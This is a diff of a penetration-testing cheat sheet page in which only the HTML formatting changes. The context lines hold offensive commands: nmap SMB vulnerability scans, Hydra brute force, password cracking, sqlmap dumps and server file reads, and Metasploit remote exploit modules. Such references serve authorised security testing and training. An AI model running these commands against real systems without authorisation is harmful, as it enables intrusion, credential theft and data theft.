@@ -6,7 +6,7 @@ draft: false
 summary: 'Sith CheatSheet'
 ---
 
-<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
 <h2>Recon and Enumeration</h2>
 <h3>NMAP Commands</h3>
 <table>
@@ -30,7 +30,7 @@ summary: 'Sith CheatSheet'
 <td>As above but scans all TCP ports and UDP scan (takes even longer)</td>
 </tr>
 <tr>
-<td>nmap -v -p 445 –script=smb-check-vulns<br>
+<td>nmap -v -p 445 –script=smb-check-vulns<br />
 –script-args=unsafe=1 192.168.1.X</td>
 <td>Nmap script to scan for vulnerable SMB servers – WARNING: unsafe=1 may cause knockover</td>
 </tr>
@@ -95,7 +95,7 @@ summary: 'Sith CheatSheet'
 <td>Show active connections continously</td>
 </tr>
 <tr>
-<td>netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head</td>
+<td>netstat -tn 2&gt;/dev/null | grep :80 | awk '&#123;print $5&#125;' | cut -d: -f1 | sort | uniq -c | sort -nr | head</td>
 <td>IPs with high number of connections</td>
 </tr>
 <tr>
@@ -191,12 +191,12 @@ summary: 'Sith CheatSheet'
 <td>Mount NFS share to /mnt/nfs</td>
 </tr>
 <tr>
-<td>mount -t cifs -o username=user,password=pass<br>
+<td>mount -t cifs -o username=user,password=pass<br />
 ,domain=blah //192.168.1.X/share-name /mnt/cifs</td>
 <td>Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)</td>
 </tr>
 <tr>
-<td>net use Z: \\win-server\share password<br>
+<td>net use Z: \\win-server\share password<br />
 /user:domain\janedoe /savecred /p:no</td>
 <td>Mount a Windows share on Windows from the command line</td>
 </tr>
@@ -235,7 +235,7 @@ summary: 'Sith CheatSheet'
 <tbody>
 <tr>
 <td>snmpcheck -t 192.168.1.X -c public<p></p>
-<p>snmpwalk -c public -v1 192.168.1.X 1|<br>
+<p>snmpwalk -c public -v1 192.168.1.X 1|<br />
 grep hrSWRunName|cut -d* * -f</p>
 <p>snmpenum -t 192.168.1.X</p>
 <p>onesixtyone -c names -i hosts</p></td>
@@ -322,7 +322,7 @@ grep hrSWRunName|cut -d* * -f</p>
 </thead>
 <tbody>
 <tr>
-<td>python /usr/share/doc/python-impacket-doc/examples<br>
+<td>python /usr/share/doc/python-impacket-doc/examples<br />
 /samrdump.py 192.168.XXX.XXX</td>
 <td>Enumerate users from SMB</td>
 </tr>
@@ -342,17 +342,17 @@ grep hrSWRunName|cut -d* * -f</p>
 </thead>
 <tbody>
 <tr>
-<td>snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25<br>
+<td>snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25<br />
 |cut -d” “ -f4</td>
 <td>Enmerate users from SNMP</td>
 </tr>
 <tr>
-<td>python /usr/share/doc/python-impacket-doc/examples/<br>
+<td>python /usr/share/doc/python-impacket-doc/examples/<br />
 samrdump.py SNMP 192.168.X.XXX</td>
 <td>Enmerate users from SNMP</td>
 </tr>
 <tr>
-<td>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt<br>
+<td>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt<br />
 (then grep)</td>
 <td>Search for SNMP servers with nmap, grepable output</td>
 </tr>
@@ -370,7 +370,7 @@ samrdump.py SNMP 192.168.X.XXX</td>
 </thead>
 <tbody>
 <tr>
-<td>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f<br>
+<td>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f<br />
 192.168.X.XXX ftp -V</td>
 <td>Hydra FTP brute force</td>
 </tr>
@@ -386,7 +386,7 @@ samrdump.py SNMP 192.168.X.XXX</td>
 </thead>
 <tbody>
 <tr>
-<td>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f<br>
+<td>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f<br />
 192.168.X.XXX pop3 -V</td>
 <td>Hydra POP3 brute force</td>
 </tr>
@@ -424,7 +424,7 @@ samrdump.py SNMP 192.168.X.XXX</td>
 <td>JTR password cracking</td>
 </tr>
 <tr>
-<td>john –format=descrypt –wordlist<br>
+<td>john –format=descrypt –wordlist<br />
 /usr/share/wordlists/rockyou.txt hash.txt</td>
 <td>JTR forced descrypt cracking with wordlist</td>
 </tr>
@@ -453,7 +453,7 @@ samrdump.py SNMP 192.168.X.XXX</td>
 <td>Use google to search exploit-db.com for exploits</td>
 </tr>
 <tr>
-<td>grep -R “W7” /usr/share/metasploit-framework<br>
+<td>grep -R “W7” /usr/share/metasploit-framework<br />
 /modules/exploit/windows/*</td>
 <td>Search metasploit modules using grep – msf search sucks a bit</td>
 </tr>
@@ -475,7 +475,7 @@ samrdump.py SNMP 192.168.X.XXX</td>
 <td>Windows exploit code</td>
 </tr>
 <tr>
-<td>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,<br>
+<td>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,<br />
 sys/sockt.h, sys/types.h, unistd.h</td>
 <td>Linux exploit code</td>
 </tr>
@@ -712,7 +712,7 @@ perl —e 'exec "/bin/sh";'</pre>
 <td>MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit</td>
 </tr>
 <tr>
-<td>use exploit/windows/smb/<br>
+<td>use exploit/windows/smb/<br />
 ms09_050_smb2_negotiate_func_index</td>
 <td>MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit</td>
 </tr>
@@ -1207,38 +1207,38 @@ ms09_050_smb2_negotiate_func_index</td>
 </tr>
 <tr>
 <td>SHA-256</td>
-<td>127e6fbfe24a750e72930c220a8e138275656b<br>
+<td>127e6fbfe24a750e72930c220a8e138275656b<br />
 8e5d8f48a98c3c92df2caba935</td>
 </tr>
 <tr>
 <td>SHA-256 $PASS:$SALT</td>
-<td>c73d08de890479518ed60cf670d17faa26a4a7<br>
+<td>c73d08de890479518ed60cf670d17faa26a4a7<br />
 1f995c1dcc978165399401a6c4</td>
 </tr>
 <tr>
 <td>SHA-256 $SALT:$PASS</td>
-<td>eb368a2dfd38b405f014118c7d9747fcc97f4<br>
+<td>eb368a2dfd38b405f014118c7d9747fcc97f4<br />
 f0ee75c05963cd9da6ee65ef498:560407001617</td>
 </tr>
 <tr>
 <td>SHA-512</td>
-<td>82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br>
-664fbb7adf72492e3c81ebd3e29134d9bc<br>
-12212bf83c6840f10e8246b9db54a4<br>
+<td>82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br />
+664fbb7adf72492e3c81ebd3e29134d9bc<br />
+12212bf83c6840f10e8246b9db54a4<br />
 859b7ccd0123d86e5872c1e5082f</td>
 </tr>
 <tr>
 <td>SHA-512 $PASS:$SALT</td>
-<td>e5c3ede3e49fb86592fb03f471c35ba13e8<br>
-d89b8ab65142c9a8fdafb635fa2223c24e5<br>
-558fd9313e8995019dcbec1fb58414<br>
+<td>e5c3ede3e49fb86592fb03f471c35ba13e8<br />
+d89b8ab65142c9a8fdafb635fa2223c24e5<br />
+558fd9313e8995019dcbec1fb58414<br />
 6b7bb12685c7765fc8c0d51379fd</td>
 </tr>
 <tr>
 <td>SHA-512 $SALT:$PASS</td>
-<td>976b451818634a1e2acba682da3fd6ef<br>
-a72adf8a7a08d7939550c244b237c72c7d4236754<br>
-4e826c0c83fe5c02f97c0373b6b1<br>
+<td>976b451818634a1e2acba682da3fd6ef<br />
+a72adf8a7a08d7939550c244b237c72c7d4236754<br />
+4e826c0c83fe5c02f97c0373b6b1<br />
 386cc794bf0d21d2df01bb9c08a</td>
 </tr>
 <tr>
@@ -1258,20 +1258,20 @@ a72adf8a7a08d7939550c244b237c72c7d4236754<br>
 </thead>
 <tbody>
 <tr>
-<td>sqlmap -u http://meh.com –forms –batch –crawl=10<br>
+<td>sqlmap -u http://meh.com –forms –batch –crawl=10<br />
 –cookie=jsessionid=54321 –level=5 –risk=3</td>
 <td>Automated sqlmap scan</td>
 </tr>
 <tr>
-<td>sqlmap -u TARGET -p PARAM –data=POSTDATA –cookie=COOKIE<br>
-–level=3 –current-user –current-db –passwords<br>
+<td>sqlmap -u TARGET -p PARAM –data=POSTDATA –cookie=COOKIE<br />
+–level=3 –current-user –current-db –passwords<br />
 –file-read=”/var/www/blah.php”</td>
 <td>Targeted sqlmap scan</td>
 </tr>
 <tr>
-<td>sqlmap -u “http://meh.com/meh.php?id=1”<br>
+<td>sqlmap -u “http://meh.com/meh.php?id=1”<br />
 –dbms=mysql –tech=U –random-agent –dump</td>
-<td>Scan url for union + error based injection with mysql backend<br>
+<td>Scan url for union + error based injection with mysql backend<br />
 and use a random user agent + database dump</td>
 </tr>
 <tr>
@@ -1279,7 +1279,7 @@ and use a random user agent + database dump</td>
 <td>sqlmap check form for injection</td>
 </tr>
 <tr>
-<td>sqlmap -o -u “http://meh/vuln-form” –forms<br>
+<td>sqlmap -o -u “http://meh/vuln-form” –forms<br />
 -D database-name -T users –dump</td>
 <td>sqlmap dump and crack hashes for table users on database-name.</td>
 </tr>
